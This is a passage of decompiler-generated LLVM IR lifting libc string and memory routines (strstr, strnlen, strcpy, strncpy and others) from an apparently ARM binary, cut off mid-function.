  uselistorder i32 %v0_1594054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15938.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15928, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1591c, { 1, 0 }
  uselistorder i32 %v0_15914, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 7, 6, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 1, 0, 4, 5, 8, 7, 2, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15978, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15950, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_15a1c = inttoptr i32 %arg2 to i8*
  %v3_15a1c = call i32 @_memcpy(i8* %v2_15a1c, i32 %arg1)
  ret i32 %v3_15a1c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15a24.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15a24 = phi i32 [ %v0_15a24.pre, %bb ], [ %v5_15a24, %bb3 ]
  %v0_15a20 = phi i32 [ %tmp, %bb ], [ %v5_15a20, %bb3 ]
  %v1_15a20 = inttoptr i32 %v0_15a20 to i8*
  %v2_15a20 = load i8, i8* %v1_15a20, align 1
  %v3_15a20 = zext i8 %v2_15a20 to i32
  store i32 %v3_15a20, i32* @r2, align 4
  %v1_15a24 = inttoptr i32 %v0_15a24 to i8*
  %v2_15a24 = load i8, i8* %v1_15a24, align 1
  %v3_15a24 = zext i8 %v2_15a24 to i32
  %v2_15a28 = icmp eq i8 %v2_15a20, 0
  br i1 %v2_15a28, label %.dec_label_pc_15a34_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15a24 = add i32 %v0_15a24, 1
  %v5_15a20 = add i32 %v0_15a20, 1
  %v10_15a2c = icmp eq i8 %v2_15a20, %v2_15a24
  br i1 %v10_15a2c, label %entry, label %dec_label_pc_15a34

.dec_label_pc_15a34_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %bb3, %.dec_label_pc_15a34_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15a34_crit_edge ], [ %v3_15a20, %bb3 ]
  %v2_15a34.pre-phi = sub nsw i32 %.pn, %v3_15a24
  ret i32 %v2_15a34.pre-phi

; uselistorder directives
  uselistorder i32 %v0_15a20, { 1, 0 }
  uselistorder i32 %v0_15a24, { 1, 0 }
  uselistorder label %dec_label_pc_15a34, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15a40 = load i32, i32* @r0, align 4
  %v1_15a40 = load i32, i32* @r1, align 4
  %v2_15a40 = inttoptr i32 %v0_15a40 to i8*
  %v3_15a40 = call i32 @_memcpy(i8* %v2_15a40, i32 %v1_15a40)
  ret i32 %v3_15a40
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_15a58 = load i32, i32* @r0, align 4
  %v2_15a58 = inttoptr i32 %v0_15a58 to i8*
  %v3_15a58 = call i32 @__GI_memset(i8* %v2_15a58, i32 0)
  ret i32 %v3_15a58
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_15a64 = load i8, i8* %arg2, align 1
  %v2_15a68 = icmp eq i8 %v3_15a64, 0
  %v1_15b58.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_15a68, label %dec_label_pc_15b54, label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %entry
  %v1_15a70 = add i32 %v1_15b58.pre, -1
  store i32 %v1_15a70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a80, %dec_label_pc_15a70
  %v0_15a74 = phi i32 [ %v1_15a74, %dec_label_pc_15a80 ], [ %v1_15a70, %dec_label_pc_15a70 ]
  %v1_15a74 = add i32 %v0_15a74, 1
  %v2_15a74 = inttoptr i32 %v1_15a74 to i8*
  %v3_15a74 = load i8, i8* %v2_15a74, align 1
  store i32 %v1_15a74, i32* %r0.global-to-local, align 4
  %v2_15a78 = icmp eq i8 %v3_15a74, 0
  br i1 %v2_15a78, label %dec_label_pc_15b50, label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a74
  %v9_15a80 = icmp eq i8 %v3_15a74, %v3_15a64
  br i1 %v9_15a80, label %dec_label_pc_15a88, label %dec_label_pc_15a74

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a80
  %v2_15a88 = add i32 %tmp, 1
  %v3_15a88 = inttoptr i32 %v2_15a88 to i8*
  %v4_15a88 = load i8, i8* %v3_15a88, align 1
  %v2_15a8c = icmp eq i8 %v4_15a88, 0
  br i1 %v2_15a8c, label %dec_label_pc_15b54, label %dec_label_pc_15a98

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a88
  %v1_15a98 = add i32 %v0_15a74, 2
  %v1_15aec = add i32 %tmp, 2
  %v2_15aec = inttoptr i32 %v1_15aec to i8*
  br label %dec_label_pc_15ae4

dec_label_pc_15aa8:                               ; preds = %dec_label_pc_15b44
  %v3_15aa8 = load i8, i8* %v3_15adc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ad4.preheader

dec_label_pc_15ad4.preheader:                     ; preds = %dec_label_pc_15aa8, %dec_label_pc_15ae4
  %v0_15ad43.in = phi i8 [ %v3_15aa8, %dec_label_pc_15aa8 ], [ %v3_15adc.pn, %dec_label_pc_15ae4 ]
  %v9_15ad412 = icmp eq i8 %v0_15ad43.in, %v3_15a64
  br i1 %v9_15ad412, label %dec_label_pc_15adc, label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15ad4.preheader, %dec_label_pc_15ad0
  %v0_15abc = phi i32 [ %v1_15ad0, %dec_label_pc_15ad0 ], [ %storemerge41, %dec_label_pc_15ad4.preheader ]
  %v0_15ab4.in = phi i8 [ %v3_15ad0, %dec_label_pc_15ad0 ], [ %v0_15ad43.in, %dec_label_pc_15ad4.preheader ]
  %v2_15ab4 = icmp eq i8 %v0_15ab4.in, 0
  br i1 %v2_15ab4, label %dec_label_pc_15b50, label %dec_label_pc_15abc

dec_label_pc_15abc:                               ; preds = %dec_label_pc_15ab4
  %v1_15abc = add i32 %v0_15abc, 1
  %v2_15abc = inttoptr i32 %v1_15abc to i8*
  %v3_15abc = load i8, i8* %v2_15abc, align 1
  store i32 %v1_15abc, i32* %r0.global-to-local, align 4
  %v9_15ac0 = icmp eq i8 %v3_15abc, %v3_15a64
  br i1 %v9_15ac0, label %dec_label_pc_15adc, label %dec_label_pc_15ac8

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15abc
  %v2_15ac8 = icmp eq i8 %v3_15abc, 0
  br i1 %v2_15ac8, label %dec_label_pc_15b50, label %dec_label_pc_15ad0

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15ac8
  %v1_15ad0 = add i32 %v0_15abc, 2
  %v2_15ad0 = inttoptr i32 %v1_15ad0 to i8*
  %v3_15ad0 = load i8, i8* %v2_15ad0, align 1
  store i32 %v1_15ad0, i32* %r0.global-to-local, align 4
  %v9_15ad4 = icmp eq i8 %v3_15ad0, %v3_15a64
  br i1 %v9_15ad4, label %dec_label_pc_15adc, label %dec_label_pc_15ab4

dec_label_pc_15adc:                               ; preds = %dec_label_pc_15abc, %dec_label_pc_15ad0, %dec_label_pc_15ad4.preheader
  %v0_15adc = phi i32 [ %storemerge41, %dec_label_pc_15ad4.preheader ], [ %v1_15abc, %dec_label_pc_15abc ], [ %v1_15ad0, %dec_label_pc_15ad0 ]
  %v1_15adc = add i32 %v0_15adc, 1
  br label %dec_label_pc_15ae4

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15a98, %dec_label_pc_15adc
  %storemerge41 = phi i32 [ %v1_15adc, %dec_label_pc_15adc ], [ %v1_15a98, %dec_label_pc_15a98 ]
  %v3_15adc.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_15adc.pn = load i8, i8* %v3_15adc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_15adc.pn, %v4_15a88
  br i1 %storemerge, label %dec_label_pc_15ae8, label %dec_label_pc_15ad4.preheader

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15ae4
  %v1_15ae8 = add i32 %storemerge41, 1
  %v2_15ae8 = inttoptr i32 %v1_15ae8 to i8*
  %v3_15ae8 = load i8, i8* %v2_15ae8, align 1
  %v4_15ae8 = zext i8 %v3_15ae8 to i32
  %v3_15aec = load i8, i8* %v2_15aec, align 1
  %v4_15aec = zext i8 %v3_15aec to i32
  %v9_15af4 = icmp eq i8 %v3_15ae8, %v3_15aec
  %v1_15afc = add i32 %storemerge41, -1
  store i32 %v1_15afc, i32* %r0.global-to-local, align 4
  br i1 %v9_15af4, label %dec_label_pc_15b04, label %dec_label_pc_15b44

dec_label_pc_15b04:                               ; preds = %dec_label_pc_15ae8, %dec_label_pc_15b34
  %v0_15b1c = phi i32 [ %v1_15b24, %dec_label_pc_15b34 ], [ %v1_15aec, %dec_label_pc_15ae8 ]
  %v0_15b14 = phi i32 [ %v1_15b20, %dec_label_pc_15b34 ], [ %v1_15ae8, %dec_label_pc_15ae8 ]
  %v0_15b04 = phi i32 [ %v4_15b34, %dec_label_pc_15b34 ], [ %v4_15ae8, %dec_label_pc_15ae8 ]
  %v2_15b04 = icmp eq i32 %v0_15b04, 0
  br i1 %v2_15b04, label %dec_label_pc_15b54, label %dec_label_pc_15b0c

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15b04
  %v1_15b0c = add i32 %v0_15b14, 1
  %v2_15b0c = inttoptr i32 %v1_15b0c to i8*
  %v3_15b0c = load i8, i8* %v2_15b0c, align 1
  %v1_15b10 = add i32 %v0_15b1c, 1
  %v2_15b10 = inttoptr i32 %v1_15b10 to i8*
  %v3_15b10 = load i8, i8* %v2_15b10, align 1
  %v4_15b10 = zext i8 %v3_15b10 to i32
  %v9_15b18 = icmp eq i8 %v3_15b0c, %v3_15b10
  %v1_15b20 = add i32 %v0_15b14, 2
  %v1_15b24 = add i32 %v0_15b1c, 2
  br i1 %v9_15b18, label %dec_label_pc_15b2c, label %dec_label_pc_15b44

dec_label_pc_15b2c:                               ; preds = %dec_label_pc_15b0c
  %v2_15b2c = icmp eq i8 %v3_15b0c, 0
  br i1 %v2_15b2c, label %dec_label_pc_15b54, label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b2c
  %v2_15b34 = inttoptr i32 %v1_15b24 to i8*
  %v3_15b34 = load i8, i8* %v2_15b34, align 1
  %v4_15b34 = zext i8 %v3_15b34 to i32
  %v2_15b38 = inttoptr i32 %v1_15b20 to i8*
  %v3_15b38 = load i8, i8* %v2_15b38, align 1
  %v9_15b3c = icmp eq i8 %v3_15b38, %v3_15b34
  br i1 %v9_15b3c, label %dec_label_pc_15b04, label %dec_label_pc_15b44

dec_label_pc_15b44:                               ; preds = %dec_label_pc_15b34, %dec_label_pc_15b0c, %dec_label_pc_15ae8
  %v0_15b44 = phi i32 [ %v4_15aec, %dec_label_pc_15ae8 ], [ %v4_15b34, %dec_label_pc_15b34 ], [ %v4_15b10, %dec_label_pc_15b0c ]
  %v2_15b44 = icmp eq i32 %v0_15b44, 0
  br i1 %v2_15b44, label %dec_label_pc_15b54, label %dec_label_pc_15aa8

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15a74, %dec_label_pc_15ac8, %dec_label_pc_15ab4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b44, %dec_label_pc_15b2c, %dec_label_pc_15b04, %entry, %dec_label_pc_15a88, %dec_label_pc_15b50
  %v1_15b58 = phi i32 [ %v1_15a74, %dec_label_pc_15a88 ], [ 0, %dec_label_pc_15b50 ], [ %v1_15b58.pre, %entry ], [ %v1_15afc, %dec_label_pc_15b04 ], [ %v1_15afc, %dec_label_pc_15b2c ], [ %v1_15afc, %dec_label_pc_15b44 ]
  ret i32 %v1_15b58

; uselistorder directives
  uselistorder i32 %v1_15b20, { 1, 0 }
  uselistorder i8 %v3_15adc.pn, { 1, 0 }
  uselistorder i8* %v3_15adc.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_15ad0, { 1, 0 }
  uselistorder i32 %v1_15ad0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15a74, { 0, 2, 3, 1 }
  uselistorder i8 %v3_15a64, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15b54, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15b50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15b04, { 1, 0 }
  uselistorder label %dec_label_pc_15ae4, { 1, 0 }
  uselistorder label %dec_label_pc_15adc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ab4, { 1, 0 }
  uselistorder label %dec_label_pc_15ad4.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_15b5c = icmp eq i32 %arg2, 0
  br i1 %v2_15b5c, label %bb, label %dec_label_pc_15b70

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_15b70:                               ; preds = %entry
  %v2_15b70 = add i32 %tmp, %arg2
  %v3_15b70 = icmp ult i32 %v2_15b70, %tmp
  br i1 %v3_15b70, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_15b70
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15b70, %bb19
  %v5_15c10 = phi i32 [ %v2_15b70, %dec_label_pc_15b70 ], [ -1, %bb19 ]
  %v1_15b904 = urem i32 %tmp, 4
  %v2_15b905 = icmp eq i32 %v1_15b904, 0
  br i1 %v2_15b905, label %dec_label_pc_15b98, label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %bb20, %dec_label_pc_15b8c
  %v0_15b8c = phi i32 [ %v1_15b8c, %dec_label_pc_15b8c ], [ %tmp, %bb20 ]
  %v1_15b80 = inttoptr i32 %v0_15b8c to i8*
  %v2_15b80 = load i8, i8* %v1_15b80, align 1
  %v2_15b84 = icmp eq i8 %v2_15b80, 0
  br i1 %v2_15b84, label %dec_label_pc_15c0c, label %dec_label_pc_15b8c

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15b80
  %v1_15b8c = add i32 %v0_15b8c, 1
  %v1_15b90 = urem i32 %v1_15b8c, 4
  %v2_15b90 = icmp eq i32 %v1_15b90, 0
  br i1 %v2_15b90, label %dec_label_pc_15b98, label %dec_label_pc_15b80

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b8c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_15b8c, %dec_label_pc_15b8c ]
  %v3_15bfc30 = icmp ult i32 %storemerge.lcssa, %v5_15c10
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15bfc30, label %dec_label_pc_15ba0, label %dec_label_pc_15c0c

dec_label_pc_15ba0:                               ; preds = %dec_label_pc_15bf8, %dec_label_pc_15b98
  %v0_15bf037 = phi i32 [ %v4_15ba0, %dec_label_pc_15bf8 ], [ %storemerge.lcssa, %dec_label_pc_15b98 ]
  %v1_15ba0 = inttoptr i32 %v0_15bf037 to i32*
  %v2_15ba0 = load i32, i32* %v1_15ba0, align 4
  %v4_15ba0 = add i32 %v0_15bf037, 4
  %v2_15ba4 = add i32 %v2_15ba0, -16843009
  %v2_15ba8 = and i32 %v2_15ba4, -2139062144
  store i32 %v2_15ba8, i32* @ip, align 4
  %v2_15bac = icmp eq i32 %v2_15ba8, 0
  br i1 %v2_15bac, label %dec_label_pc_15bf8, label %dec_label_pc_15bb4

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15ba0
  %v2_15bb4 = inttoptr i32 %v0_15bf037 to i8*
  %v3_15bb4 = load i8, i8* %v2_15bb4, align 1
  %v2_15bb8 = icmp eq i8 %v3_15bb4, 0
  br i1 %v2_15bb8, label %bb21, label %dec_label_pc_15bc8

bb21:                                             ; preds = %dec_label_pc_15bb4
  br label %dec_label_pc_15c0c

dec_label_pc_15bc8:                               ; preds = %dec_label_pc_15bb4
  %v1_15bc8 = add i32 %v0_15bf037, 1
  %v2_15bc8 = inttoptr i32 %v1_15bc8 to i8*
  %v3_15bc8 = load i8, i8* %v2_15bc8, align 1
  %v2_15bcc = icmp eq i8 %v3_15bc8, 0
  br i1 %v2_15bcc, label %dec_label_pc_15c0c, label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bc8
  %v1_15bd8 = add i32 %v0_15bf037, 2
  %v2_15bd8 = inttoptr i32 %v1_15bd8 to i8*
  %v3_15bd8 = load i8, i8* %v2_15bd8, align 1
  %v2_15bdc = icmp eq i8 %v3_15bd8, 0
  br i1 %v2_15bdc, label %dec_label_pc_15c0c, label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15bd8
  %v1_15be8 = add i32 %v0_15bf037, 3
  %v2_15be8 = inttoptr i32 %v1_15be8 to i8*
  %v3_15be8 = load i8, i8* %v2_15be8, align 1
  %v2_15bec = icmp eq i8 %v3_15be8, 0
  br i1 %v2_15bec, label %dec_label_pc_15c0c, label %dec_label_pc_15bf8

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15be8, %dec_label_pc_15ba0
  %v3_15bfc = icmp ult i32 %v4_15ba0, %v5_15c10
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15bfc, label %dec_label_pc_15ba0, label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %dec_label_pc_15bf8, %dec_label_pc_15b98, %dec_label_pc_15b80, %dec_label_pc_15bc8, %dec_label_pc_15bd8, %dec_label_pc_15be8, %bb21
  %v1_15c0c = phi i32 [ %v0_15bf037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_15b98 ], [ %v1_15bc8, %dec_label_pc_15bc8 ], [ %v1_15bd8, %dec_label_pc_15bd8 ], [ %v1_15be8, %dec_label_pc_15be8 ], [ %v5_15c10, %dec_label_pc_15bf8 ], [ %v0_15b8c, %dec_label_pc_15b80 ]
  %v3_15c0c = icmp uge i32 %v5_15c10, %v1_15c0c
  %v9_15c0c = icmp eq i32 %v5_15c10, %v1_15c0c
  %v2_15c10 = xor i1 %v3_15c0c, true
  %v3_15c10 = or i1 %v9_15c0c, %v2_15c10
  br i1 %v3_15c10, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_15c0c
  %v6_15c10 = sub i32 %v5_15c10, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_15c0c, %bb22
  %v5_15c14 = phi i32 [ %v1_15c0c, %dec_label_pc_15c0c ], [ %v6_15c10, %bb22 ]
  %v2_15c14 = xor i1 %v9_15c0c, true
  %v3_15c14 = and i1 %v3_15c0c, %v2_15c14
  br i1 %v3_15c14, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_15c14 = sub i32 %v5_15c14, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_15c1c = phi i32 [ 0, %bb ], [ %v5_15c14, %bb23 ], [ %v6_15c14, %bb24 ]
  ret i32 %v1_15c1c

; uselistorder directives
  uselistorder i1 %v3_15c0c, { 1, 0 }
  uselistorder i32 %v4_15ba0, { 1, 0 }
  uselistorder i32 %v0_15bf037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15b8c, { 1, 0, 2 }
  uselistorder i32 %v5_15c10, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_15c0c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_15b80, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_15c381 = load i32, i32* @r1, align 4
  %v1_15c382 = inttoptr i32 %v0_15c381 to i8*
  %v2_15c383 = load i8, i8* %v1_15c382, align 1
  %v2_15c3c5 = icmp eq i8 %v2_15c383, 0
  store i1 %v2_15c3c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_15c383, i8* %arg1, align 1
  br i1 %v2_15c3c5, label %dec_label_pc_15c48, label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %entry, %dec_label_pc_15c30
  %v0_15c30 = load i32, i32* @r1, align 4
  %v1_15c30 = add i32 %v0_15c30, 1
  store i32 %v1_15c30, i32* @r1, align 4
  %v0_15c34 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c34 = add i32 %v0_15c34, 1
  store i32 %v1_15c34, i32* %r2.global-to-local, align 4
  %v1_15c38 = inttoptr i32 %v1_15c30 to i8*
  %v2_15c38 = load i8, i8* %v1_15c38, align 1
  %v2_15c3c = icmp eq i8 %v2_15c38, 0
  store i1 %v2_15c3c, i1* %cpsr_z.global-to-local, align 1
  %v3_15c40 = inttoptr i32 %v1_15c34 to i8*
  store i8 %v2_15c38, i8* %v3_15c40, align 1
  %v0_15c44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c44, label %dec_label_pc_15c48, label %dec_label_pc_15c30

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c30, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15c30, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_15c4c = icmp eq i32 %arg2, 3
  store i1 %v7_15c4c, i1* %cpsr_z.global-to-local, align 1
  %v0_15c50 = load i32, i32* @lr, align 4
  store i32 %v0_15c50, i32* %stack_var_-4, align 4
  %v1_15c54 = add i32 %arg1, -1
  store i32 %v1_15c54, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_15cd0, label %dec_label_pc_15c5c

dec_label_pc_15c5c:                               ; preds = %entry
  %v3_15c5c = udiv i32 %arg2, 4
  store i32 %v3_15c5c, i32* %lr.global-to-local, align 4
  %v0_15c60.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15c60

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15cac, %dec_label_pc_15c5c
  %v2_15c68 = phi i32 [ %v6_15ca0, %dec_label_pc_15cac ], [ %v1_15c54, %dec_label_pc_15c5c ]
  %v0_15c60 = phi i32 [ %v1_15cb0, %dec_label_pc_15cac ], [ %v0_15c60.pre, %dec_label_pc_15c5c ]
  %v1_15c60 = inttoptr i32 %v0_15c60 to i8*
  %v2_15c60 = load i8, i8* %v1_15c60, align 1
  %v3_15c60 = zext i8 %v2_15c60 to i32
  store i32 %v3_15c60, i32* %r3.global-to-local, align 4
  %v2_15c64 = icmp eq i8 %v2_15c60, 0
  store i1 %v2_15c64, i1* %cpsr_z.global-to-local, align 1
  %v3_15c68 = add i32 %v2_15c68, 1
  %v4_15c68 = inttoptr i32 %v3_15c68 to i8*
  store i8 %v2_15c60, i8* %v4_15c68, align 1
  %v5_15c68 = load i32, i32* @ip, align 4
  %v6_15c68 = add i32 %v5_15c68, 1
  store i32 %v6_15c68, i32* @ip, align 4
  %v0_15c6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c6c, label %dec_label_pc_15cbc, label %dec_label_pc_15c70

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c60
  %v0_15c70 = load i32, i32* @r1, align 4
  %v1_15c70 = add i32 %v0_15c70, 1
  %v2_15c70 = inttoptr i32 %v1_15c70 to i8*
  %v3_15c70 = load i8, i8* %v2_15c70, align 1
  %v4_15c70 = zext i8 %v3_15c70 to i32
  store i32 %v4_15c70, i32* %r3.global-to-local, align 4
  %v2_15c74 = icmp eq i8 %v3_15c70, 0
  store i1 %v2_15c74, i1* %cpsr_z.global-to-local, align 1
  %v3_15c78 = add i32 %v5_15c68, 2
  %v4_15c78 = inttoptr i32 %v3_15c78 to i8*
  store i8 %v3_15c70, i8* %v4_15c78, align 1
  %v5_15c78 = load i32, i32* @ip, align 4
  %v6_15c78 = add i32 %v5_15c78, 1
  store i32 %v6_15c78, i32* @ip, align 4
  %v0_15c7c = load i32, i32* @r1, align 4
  %v1_15c7c = add i32 %v0_15c7c, 1
  store i32 %v1_15c7c, i32* %r1.global-to-local, align 4
  %v0_15c80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c80, label %dec_label_pc_15cbc, label %dec_label_pc_15c84

dec_label_pc_15c84:                               ; preds = %dec_label_pc_15c70
  %v1_15c84 = add i32 %v0_15c7c, 2
  %v2_15c84 = inttoptr i32 %v1_15c84 to i8*
  %v3_15c84 = load i8, i8* %v2_15c84, align 1
  %v4_15c84 = zext i8 %v3_15c84 to i32
  store i32 %v4_15c84, i32* %r3.global-to-local, align 4
  %v2_15c88 = icmp eq i8 %v3_15c84, 0
  store i1 %v2_15c88, i1* %cpsr_z.global-to-local, align 1
  %v3_15c8c = add i32 %v5_15c78, 2
  %v4_15c8c = inttoptr i32 %v3_15c8c to i8*
  store i8 %v3_15c84, i8* %v4_15c8c, align 1
  %v5_15c8c = load i32, i32* @ip, align 4
  %v6_15c8c = add i32 %v5_15c8c, 1
  store i32 %v6_15c8c, i32* @ip, align 4
  %v0_15c90 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c90 = add i32 %v0_15c90, 1
  store i32 %v1_15c90, i32* %r1.global-to-local, align 4
  %v0_15c94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c94, label %dec_label_pc_15cbc, label %dec_label_pc_15c98

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c84
  %v1_15c98 = add i32 %v0_15c90, 2
  %v2_15c98 = inttoptr i32 %v1_15c98 to i8*
  %v3_15c98 = load i8, i8* %v2_15c98, align 1
  %v4_15c98 = zext i8 %v3_15c98 to i32
  store i32 %v4_15c98, i32* %r3.global-to-local, align 4
  %v2_15c9c = icmp eq i8 %v3_15c98, 0
  store i1 %v2_15c9c, i1* %cpsr_z.global-to-local, align 1
  %v3_15ca0 = add i32 %v5_15c8c, 2
  %v4_15ca0 = inttoptr i32 %v3_15ca0 to i8*
  store i8 %v3_15c98, i8* %v4_15ca0, align 1
  %v5_15ca0 = load i32, i32* @ip, align 4
  %v6_15ca0 = add i32 %v5_15ca0, 1
  store i32 %v6_15ca0, i32* @ip, align 4
  %v0_15ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ca4 = add i32 %v0_15ca4, 1
  store i32 %v1_15ca4, i32* %r1.global-to-local, align 4
  %v0_15ca8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ca8, label %dec_label_pc_15cbc, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %dec_label_pc_15c98
  %v0_15cac = load i32, i32* %lr.global-to-local, align 4
  %v1_15cac = add i32 %v0_15cac, -1
  store i32 %v1_15cac, i32* %lr.global-to-local, align 4
  %v7_15cac = icmp eq i32 %v0_15cac, 1
  store i1 %v7_15cac, i1* %cpsr_z.global-to-local, align 1
  %v1_15cb0 = add i32 %v0_15ca4, 2
  store i32 %v1_15cb0, i32* @r1, align 4
  br i1 %v7_15cac, label %dec_label_pc_15cd0, label %dec_label_pc_15c60

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15c98, %dec_label_pc_15c84, %dec_label_pc_15c70, %dec_label_pc_15c60
  %v1_15cbc = phi i32 [ %v6_15ca0, %dec_label_pc_15c98 ], [ %v6_15c8c, %dec_label_pc_15c84 ], [ %v6_15c78, %dec_label_pc_15c70 ], [ %v6_15c68, %dec_label_pc_15c60 ]
  %v2_15cbc1 = sub i32 %arg1, %v1_15cbc
  %v2_15cc0 = add i32 %v2_15cbc1, %arg2
